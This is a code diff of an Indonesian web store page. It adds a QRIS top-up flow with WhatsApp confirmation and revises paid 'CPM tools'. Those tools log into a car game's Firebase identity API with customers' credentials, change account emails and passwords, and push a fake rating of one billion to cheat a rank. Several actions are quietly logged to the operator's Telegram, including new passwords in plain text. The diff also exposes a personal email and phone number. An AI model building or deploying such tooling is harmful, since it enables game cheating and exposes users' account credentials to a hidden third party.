@@ -164,16 +164,47 @@
         </div>
 
         <div x-show="currentPage === 'topup'" x-transition class="container mx-auto px-4 py-10">
-            <div class="max-w-md mx-auto card-glass p-10 text-center">
-                <i class="fas fa-wallet text-5xl text-green-500 mb-6"></i>
-                <h2 class="text-3xl font-bold gradient-text mb-8 italic uppercase">Top Up Saldo</h2>
-                <div class="grid grid-cols-2 gap-4">
-                    <button @click="prosesTopUp(20000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold transition hover:bg-green-500/10">20.000</button>
-                    <button @click="prosesTopUp(50000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold transition hover:bg-green-500/10">50.000</button>
-                    <button @click="prosesTopUp(100000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold transition hover:bg-green-500/10">100.000</button>
-                    <button @click="prosesTopUp(150000)" class="p-4 bg-white/5 border border-white/10 rounded-xl hover:border-green-500 font-bold transition hover:bg-green-500/10">150.000</button>
+            <div class="max-w-md mx-auto card-glass p-8 shadow-2xl border-green-500/20">
+                <div class="text-center mb-8">
+                    <div class="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-qrcode text-3xl text-green-500"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold gradient-text italic uppercase">Metode Top Up QRIS</h2>
+                    <p class="text-[10px] text-gray-500 mt-1 uppercase tracking-widest italic">Silakan pilih nominal saldo</p>
                 </div>
-                <button @click="topUpCustom()" class="mt-4 w-full p-3 bg-white/5 border border-white/10 rounded-xl text-gray-400 text-sm italic">Nominal Lainnya...</button>
+
+                <div class="grid grid-cols-2 gap-3 mb-8">
+                    <template x-for="amt in [20000, 50000, 100000, 150000]">
+                        <button @click="selectedAmount = amt" 
+                                :class="selectedAmount === amt ? 'border-green-500 bg-green-500/10 text-white' : 'border-white/10 bg-white/5 text-gray-400'"
+                                class="p-4 border rounded-xl font-bold transition-all hover:scale-105 active:scale-95 text-sm">
+                            Rp <span x-text="amt.toLocaleString()"></span>
+                        </button>
+                    </template>
+                </div>
+
+                <div x-show="selectedAmount > 0" x-transition class="mb-8 p-4 bg-white rounded-2xl border-4 border-dashed border-green-500/30 shadow-inner">
+                    <p class="text-black text-[10px] font-bold text-center mb-2 uppercase italic">Scan QRIS AWIMEDAN STORE</p>
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=AWIMEDAN-PAYMENT" 
+                         class="w-full aspect-square object-contain rounded-lg" alt="QRIS Payment">
+                    <p class="text-center text-black font-black mt-2 text-lg italic" x-text="'TOTAL: Rp ' + selectedAmount.toLocaleString()"></p>
+                </div>
+
+                <div x-show="selectedAmount > 0" class="space-y-4">
+                    <div class="p-4 bg-white/5 rounded-xl border border-white/10">
+                        <label class="block text-xs text-gray-400 uppercase font-bold mb-3 italic">Upload Bukti Transfer:</label>
+                        <input type="file" @change="handleFileUpload" accept="image/qris.jpg" 
+                               class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-green-500 file:text-white hover:file:bg-green-600 cursor-pointer">
+                    </div>
+
+                    <button @click="sendToWhatsApp" 
+                            :disabled="!selectedFile"
+                            :class="selectedFile ? 'opacity-100' : 'opacity-50 cursor-not-allowed'"
+                            class="w-full bg-green-500 hover:bg-green-600 text-white py-4 rounded-xl font-bold flex items-center justify-center space-x-2 shadow-lg shadow-green-500/20">
+                        <i class="fab fa-whatsapp text-xl"></i>
+                        <span>KONFIRMASI KE ADMIN</span>
+                    </button>
+                </div>
             </div>
         </div>
 
@@ -256,6 +287,10 @@
                 cpmForm: { gameId: '', email: '', password: '', key: '' },
                 userHistory: [],
                 
+                // --- TOPUP STATE ---
+                selectedAmount: 0,
+                selectedFile: null,
+
                 // --- ADMIN CONFIG ---
                 adminEmail: "kulgarfreefire2022@gmail.com", 
                 isAdmin: false,
@@ -333,15 +368,29 @@
                     });
                 },
 
-                // SISTEM BELI POTONG SALDO & CATAT HISTORY
+                // TOPUP LOGIC
+                handleFileUpload(event) {
+                    this.selectedFile = event.target.files[0];
+                    if(this.selectedFile) {
+                        this.logToTelegram(`📸 **UPLOAD BUKTI**\nUser: \`${this.user.email}\` sedang mengupload bukti transfer.`);
+                    }
+                },
+
+                sendToWhatsApp() {
+                    if (!this.selectedFile) return alert("Silakan upload foto bukti transfer!");
+                    const waNum = "6281330750863";
+                    const msg = `Halo Admin AWIMEDAN,\n\nSaya konfirmasi Top Up Saldo.\nEmail: ${this.user.email}\nNominal: Rp ${this.selectedAmount.toLocaleString()}\n\nSaya melampirkan foto bukti transfer berikut ini:`;
+                    window.open(`https://wa.me/${waNum}?text=${encodeURIComponent(msg)}`, '_blank');
+                    alert("Aplikasi akan membuka WhatsApp. Harap kirimkan foto bukti transfer tersebut di chat Admin.");
+                },
+
                 async beliProduk(productName) {
                     if (!this.user) return alert("Silahkan login terlebih dahulu!");
-                    
                     const product = this.products.find(p => p.name === productName);
                     const currentBalance = this.userData.balance || 0;
 
                     if (currentBalance < product.price) {
-                        alert(`Saldo tidak cukup!\nHarga: Rp ${product.price.toLocaleString()}\nSaldo: Rp ${currentBalance.toLocaleString()}`);
+                        alert(`Saldo tidak cukup!`);
                         this.currentPage = 'topup';
                         return;
                     }
@@ -350,69 +399,40 @@
                         this.loading = true;
                         try {
                             const userRef = firebase.database().ref('users/' + this.user.uid + '/balance');
-                            
-                            // 1. Potong Saldo via Transaction (Sangat Aman)
                             await userRef.transaction((balance) => {
                                 if (balance >= product.price) return balance - product.price;
-                                return; // Batalkan jika tiba-tiba tidak cukup
+                                return;
                             });
 
-                            // 2. Simpan ke Riwayat Belanja (Database history/)
                             const historyRef = firebase.database().ref('history/' + this.user.uid).push();
-                            await historyRef.set({
-                                productName: productName,
-                                price: product.price,
-                                date: Date.now()
-                            });
+                            await historyRef.set({ productName: productName, price: product.price, date: Date.now() });
 
-                            // 3. Kirim Laporan ke Telegram Admin
-                            const teleMsg = `🛒 **PEMBELIAN BERHASIL**\n` +
-                                            `User: \`${this.user.email}\`\n` +
-                                            `Produk: *${productName}*\n` +
-                                            `Harga: Rp ${product.price.toLocaleString()}\n` +
-                                            `Sisa Saldo: Rp ${(currentBalance - product.price).toLocaleString()}`;
-                            this.logToTelegram(teleMsg);
-
-                            alert("Pembelian Berhasil! Sisa saldo Anda telah diperbarui.");
+                            this.logToTelegram(`🛒 **PEMBELIAN**\nUser: \`${this.user.email}\` membeli *${productName}*`);
+                            alert("Pembelian Berhasil!");
                             
-                            // 4. Arahkan ke WhatsApp Admin
-                            const waMsg = `Halo Admin AWIMEDAN, saya baru saja membeli "${productName}" melalui Web Store.\n\nEmail: ${this.user.email}`;
+                            const waMsg = `Halo Admin, saya baru beli "${productName}"\nEmail: ${this.user.email}`;
                             window.open(`https://wa.me/6281330750863?text=${encodeURIComponent(waMsg)}`, '_blank');
-
-                        } catch (e) {
-                            alert("Kesalahan transaksi: " + e.message);
-                        }
+                        } catch (e) { alert("Error: " + e.message); }
                         this.loading = false;
                     }
                 },
 
                 updateBalance(uid, amt) {
                     firebase.database().ref('users/' + uid + '/balance').transaction(c => (c || 0) + amt);
-                    this.logToTelegram(`💰 **ADMIN TOPUP**\nUID: \`${uid}\`\nJumlah: +Rp ${amt.toLocaleString()}`);
+                    this.logToTelegram(`💰 **ADMIN TOPUP**\nUID: \`${uid}\` (+Rp ${amt})`);
                 },
 
                 resetBalance(uid) {
-                    if(confirm("Hapus saldo user ini?")) firebase.database().ref('users/' + uid + '/balance').set(0);
+                    if(confirm("Hapus saldo?")) firebase.database().ref('users/' + uid + '/balance').set(0);
                 },
 
-                prosesTopUp(nominal) {
-                    if (!this.user) return alert("Login dulu!");
-                    const msg = `Halo Admin AWIMEDAN, saya mau Top Up Saldo Rp ${nominal.toLocaleString()}\nEmail: ${this.user.email}`;
-                    window.open(`https://wa.me/6281330750863?text=${encodeURIComponent(msg)}`, '_blank');
-                },
-
-                topUpCustom() {
-                    const n = prompt("Nominal Top Up:");
-                    if (n && !isNaN(n)) this.prosesTopUp(parseInt(n));
-                },
-
-                // --- CPM TOOLS LOGIC ---
+                // CPM TOOLS
                 async handleCpmLogin() {
-                    if (!this.cpmForm.key || !this.cpmForm.email) { this.message = "Data wajib diisi!"; return; }
+                    if (!this.cpmForm.key || !this.cpmForm.email) { this.message = "Isi data!"; return; }
                     this.loading = true;
                     try {
                         const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
-                        if (!snap.val() || snap.val().status !== 'active') throw new Error("Key Tidak Valid!");
+                        if (!snap.val() || snap.val().status !== 'active') throw new Error("Key Invalid!");
                         const game = this.gameApis[this.cpmForm.gameId];
                         const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${game.api}`, {
                             method: 'POST', headers: { "Content-Type": "application/json" },
@@ -422,39 +442,39 @@
                         if (data.idToken) {
                             this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: game };
                             this.message = "";
-                            this.logToTelegram(`🔑 **INJECTOR LOGIN**\nAcc: \`${data.email}\`\nGame: ${game.name}`);
-                        } else { throw new Error("Login CPM Gagal!"); }
+                            this.logToTelegram(`🔑 **LOGIN TOOL**\nAcc: \`${data.email}\``);
+                        } else throw new Error("Login Gagal!");
                     } catch (e) { this.message = e.message; }
                     this.loading = false;
                 },
 
                 async changeEmailPrompt() {
                     const ne = prompt("Email Baru:");
-                    if(!ne || !ne.includes("@")) return;
+                    if(!ne) return;
                     this.loading = true;
                     try {
                         await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
                             method: 'POST', headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ idToken: this.cpmUser.token, email: ne, returnSecureToken: true, upgradeToFederatedLogin: true })
                         });
-                        this.logToTelegram(`📧 **EMAIL CHANGED**\nOld: \`${this.cpmUser.email}\`\nNew: \`${ne}\``);
+                        this.logToTelegram(`📧 **GANTI EMAIL**\nNew: \`${ne}\``);
                         this.cpmUser.email = ne;
-                        alert("Berhasil Ganti Email!");
+                        alert("Berhasil!");
                     } catch (e) { alert("Gagal!"); }
                     this.loading = false;
                 },
 
                 async changePasswordPrompt() {
-                    const np = prompt("Password Baru (Min 6 Karakter):");
-                    if(!np || np.length < 6) return;
+                    const np = prompt("Password Baru:");
+                    if(!np) return;
                     this.loading = true;
                     try {
                         await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
                             method: 'POST', headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ idToken: this.cpmUser.token, password: np, returnSecureToken: true })
                         });
-                        this.logToTelegram(`🔑 **PASSWORD UPDATED**\nAcc: \`${this.cpmUser.email}\`\nPass Baru: \`${np}\``);
-                        alert("Berhasil Ganti Password!");
+                        this.logToTelegram(`🔑 **GANTI PASS**\nAcc: \`${this.cpmUser.email}\` Pass: \`${np}\``);
+                        alert("Berhasil!");
                     } catch (e) { alert("Gagal!"); }
                     this.loading = false;
                 },
@@ -467,7 +487,7 @@
                             body: JSON.stringify({ "auth": this.cpmUser.token, "rating": 1000000000 })
                         });
                         this.logToTelegram(`👑 **KING RANK**\nAcc: \`${this.cpmUser.email}\``);
-                        alert("AKUN TELAH MENJADI KING RANK!");
+                        alert("SUKSES KING RANK!");
                     } catch (e) { alert("Gagal!"); }
                     this.loading = false;
                 },
@@ -485,3 +505,4 @@
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
 </body>
 </html>
+
